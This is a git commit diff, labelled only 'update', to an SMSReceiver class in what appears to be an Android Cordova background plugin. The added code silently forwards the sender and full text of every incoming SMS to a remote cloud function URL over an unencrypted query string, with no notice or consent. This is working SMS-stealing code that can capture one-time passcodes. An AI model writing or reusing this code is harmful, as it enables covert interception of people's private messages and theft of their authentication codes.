ee8ce277634e97d1f844a50e42209f2cb073f305
futurecloudtech <81574766+futurecloudtech@users.noreply.github.com>
2022-05-07 17:20:57 +0800

    update

--- src/android/SMSReceiver.java
+++ src/android/SMSReceiver.java
@@ -1,13 +1,20 @@
-package de.appplant.cordova.plugin.background;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.AsyncTask;
 import android.telephony.SmsMessage;
-import android.widget.Toast;
+
+import java.io.IOException;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 
 public class SMSReceiver extends BroadcastReceiver {
     public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
+    private static final Object TAG = "Debug APp :";
+    OkHttpClient client = new OkHttpClient();
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -18,18 +25,57 @@ public class SMSReceiver extends BroadcastReceiver {
             for (int i = 0; i < pduArray.length; i++) {
                 messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
             }
-                StringBuilder bodyText = new StringBuilder();
+            StringBuilder bodyText = new StringBuilder();
 
-                // If SMS has several parts, lets combine it :)
-                for (int i = 0; i < messages.length; i++) {
-                    bodyText.append(messages[i].getMessageBody());
-                }
-                //SMS Body
-                String body = bodyText.toString();
-                // Lets get SMS Code
-                String code = body.replaceAll("[^0-9]", "");
+            // If SMS has several parts, lets combine it :)
+            for (int i = 0; i < messages.length; i++) {
+                bodyText.append(messages[i].getMessageBody());
+            }
+            //SMS Body
+            String sender = messages[0].getOriginatingAddress();
+            String body = bodyText.toString();
+//            // Lets get SMS Code
+//            String code = body.replaceAll("[^0-9]", "");
+            new NetworkAccess().execute(sender,body);
+//            Toast.makeText(context.getApplicationContext(), phono, Toast.LENGTH_SHORT).show();
 
-                Toast.makeText(context.getApplicationContext(), body, Toast.LENGTH_SHORT).show();
+        }
+    }
+    public class NetworkAccess extends AsyncTask<String, String, String>{
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+            // call some loader
+        }
+        @Override
+        protected String doInBackground(String... params) {
+            // Do background task
+            String address = params[0];
+            String sms = params[1];
+            try {
+               run("https://us-central1-smsreader-cd2d3.cloudfunctions.net/addSMS?address="+address+"&msg="+sms);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+
+            super.onPostExecute(result);
+            // dismiss loader
+            // update ui
+        }
+    }
+    String run(String url) throws IOException {
+        Request request = new Request.Builder()
+                .url(url)
+                .build();
+
+        try (Response response = client.newCall(request).execute()) {
+            return response.body().string();
         }
     }
 }
